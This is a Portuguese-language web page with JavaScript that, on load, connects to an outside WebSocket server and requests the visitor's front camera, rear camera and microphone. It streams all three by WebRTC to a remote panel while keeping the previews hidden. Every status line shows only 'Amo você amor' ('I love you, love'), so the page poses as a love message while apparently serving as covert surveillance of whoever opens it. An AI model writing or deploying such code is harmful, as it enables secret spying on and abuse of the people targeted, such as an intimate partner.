<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transmissão</title>
</head>

<body>

    <h1>Transmissão autorizada</h1>

    <p id="status">Conectando ao servidor...</p>

    <!-- As imagens ficam ocultas no celular -->
    <video id="frontPreview" autoplay playsinline muted hidden></video>
    <video id="rearPreview" autoplay playsinline muted hidden></video>

<script>

const status = document.getElementById("status");

const socket = new WebSocket(
    "wss://casaco-mercedes.onrender.com"
);

let peer = null;

let frontStream = null;
let rearStream = null;
let audioStream = null;

socket.onopen = async () => {

    status.textContent =
        "Amo você amor!";

    socket.send(JSON.stringify({
        tipo: "camera"
    }));

    try {

        // Câmera frontal
        frontStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user"
            },
            audio: false
        });

        // Câmera traseira
        rearStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: {
                    exact: "environment"
                }
            },
            audio: false
        });

        // Microfone
        audioStream = await navigator.mediaDevices.getUserMedia({
            video: false,
            audio: true
        });

        document.getElementById("frontPreview").srcObject =
            frontStream;

        document.getElementById("rearPreview").srcObject =
            rearStream;

        iniciarWebRTC();

        status.textContent =
            "Amo você amor";

    } catch (erro) {

        console.error(erro);

        status.textContent =
            "Amo você amor";
    }
};


function iniciarWebRTC() {

    peer = new RTCPeerConnection({

        iceServers: [
            {
                urls: "stun:stun.l.google.com:19302"
            }
        ]

    });


    // FRONTAL
    const frontTrack =
        frontStream.getVideoTracks()[0];

    const frontOnlyStream =
        new MediaStream([frontTrack]);

    peer.addTrack(
        frontTrack,
        frontOnlyStream
    );


    // TRASEIRA
    const rearTrack =
        rearStream.getVideoTracks()[0];

    const rearOnlyStream =
        new MediaStream([rearTrack]);

    peer.addTrack(
        rearTrack,
        rearOnlyStream
    );


    // ÁUDIO
    const audioTrack =
        audioStream.getAudioTracks()[0];

    const audioOnlyStream =
        new MediaStream([audioTrack]);

    peer.addTrack(
        audioTrack,
        audioOnlyStream
    );


    peer.onicecandidate = evento => {

        if (evento.candidate) {

            socket.send(JSON.stringify({

                tipo: "candidato",

                candidato: evento.candidate

            }));

        }

    };

}


socket.onmessage = async evento => {

    const mensagem =
        JSON.parse(evento.data);


    if (mensagem.tipo === "painel-pronto") {

        if (!peer) return;

        const oferta =
            await peer.createOffer();

        await peer.setLocalDescription(oferta);

        socket.send(JSON.stringify({

            tipo: "oferta",

            oferta: peer.localDescription

        }));

    }


    if (mensagem.tipo === "resposta") {

        if (!peer) return;

        await peer.setRemoteDescription(
            mensagem.resposta
        );

    }


    if (mensagem.tipo === "candidato") {

        if (!peer) return;

        try {

            await peer.addIceCandidate(
                mensagem.candidato
            );

        } catch (erro) {

            console.error(erro);

        }

    }


    if (mensagem.tipo === "encerrar") {

        encerrarTudo();

    }

};


function encerrarTudo() {

    if (frontStream) {

        frontStream.getTracks().forEach(
            track => track.stop()
        );

    }

    if (rearStream) {

        rearStream.getTracks().forEach(
            track => track.stop()
        );

    }

    if (audioStream) {

        audioStream.getTracks().forEach(
            track => track.stop()
        );

    }

    if (peer) {

        peer.close();

    }

    status.textContent =
        "Amo você amor";

}


socket.onerror = () => {

    status.textContent =
        "Amo você amor";

};


socket.onclose = () => {

    if (
        !status.textContent.includes("encerrada")
    ) {

        status.textContent =
            "Amo você amor";

    }

};

</script>

</body>
</html>
